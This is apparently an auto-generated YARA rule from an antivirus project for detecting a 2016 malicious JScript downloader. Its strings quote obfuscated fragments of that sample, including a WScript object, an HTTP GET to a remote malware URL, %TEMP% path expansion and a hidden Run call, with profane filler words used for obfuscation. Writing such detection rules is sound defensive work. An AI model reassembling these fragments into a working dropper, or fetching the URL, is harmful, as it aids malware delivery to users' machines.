rule sig_20160428_495fd6a4aef06ec5539715080a57dad3 {
  meta:
    description = "datamaliciousorder - file 20160428_495fd6a4aef06ec5539715080a57dad3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8fc550d88d1bd8da9b46ff8182df069e482fb83877e78dfc60d7abd64e8b271f"

  strings:
    $s1  = "YqnUfyMmlDuhEvvYaoMfs[JkoOgfPtnQwmRhgYlyHai](\"G\" + \"ET\", \"http://switchright.com/2yshda\", false);" fullword ascii
    $s2  = "function EcqZxtWcwPfcWreLqyFge() {return LozBqmOugXksOpxAjeCjl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function LrbMwlEnjTrqDxiExmDlz(KekLhtYwuBlfNwiHbaJtz){LozBqmOugXksOpxAjeCjl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function LrbMwlEnjTrqDxiExmDlz(KekLhtYwuBlfNwiHbaJtz){LozBqmOugXksOpxAjeCjl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return DbrYmiGiwJmyXngPhlYxz - YemIlcRwtRhzRkbLbgNwq;};" fullword ascii
    $s6  = "var LozBqmOugXksOpxAjeCjl = function TkmZqmZpbJdePekMknUzt() {return LuhPhhFldNujTnpDsmWix[GvrUusTsmKbmYkvYpaBsr](\"WScript\"+\"" ascii
    $s7  = "function CjqMygQyaQiiHmxYjqMcq(DbrYmiGiwJmyXngPhlYxz, YemIlcRwtRhzRkbLbgNwq){LeuFujAutBadDjwGpjEvu = LeuFujAutBadDjwGpjEvu * 1; " ascii
    $s8  = "var LuhPhhFldNujTnpDsmWix = this[\"WScript\"];" fullword ascii
    $s9  = "var LozBqmOugXksOpxAjeCjl = function TkmZqmZpbJdePekMknUzt() {return LuhPhhFldNujTnpDsmWix[GvrUusTsmKbmYkvYpaBsr](\"WScript\"+\"" ascii
    $s10 = "function EcqZxtWcwPfcWreLqyFge() {return LozBqmOugXksOpxAjeCjl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function CjqMygQyaQiiHmxYjqMcq(DbrYmiGiwJmyXngPhlYxz, YemIlcRwtRhzRkbLbgNwq){LeuFujAutBadDjwGpjEvu = LeuFujAutBadDjwGpjEvu * 1; " ascii
    $s12 = "function DeoCmrWyzNrgUeeItuNcc(){return ItrNeyDkjHnwNiaHruRes + \"\";};" fullword ascii
    $s13 = "if (YqnUfyMmlDuhEvvYaoMfs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function LrdNhsVywMymIfwOxsBxm() {return ((NhsMcrHmfYyaOlrNpgSgz == true) && (NhsMcrHmfYyaOlrNpgSgz == BmyTjfHklAufNifTilRja)) ?" ascii
    $s15 = "function LrdNhsVywMymIfwOxsBxm() {return ((NhsMcrHmfYyaOlrNpgSgz == true) && (NhsMcrHmfYyaOlrNpgSgz == BmyTjfHklAufNifTilRja)) ?" ascii
    $s16 = "PuoSqbOzhMvmWriQhdWcw = true;" fullword ascii
    $s17 = "var PuoSqbOzhMvmWriQhdWcw = false;" fullword ascii
    $s18 = "var DtmMzkDrzNsuTcxNxeJnt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function FazEraEgwVmdGqiGwwCki()" fullword ascii
    $s20 = "NhsMcrHmfYyaOlrNpgSgz = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}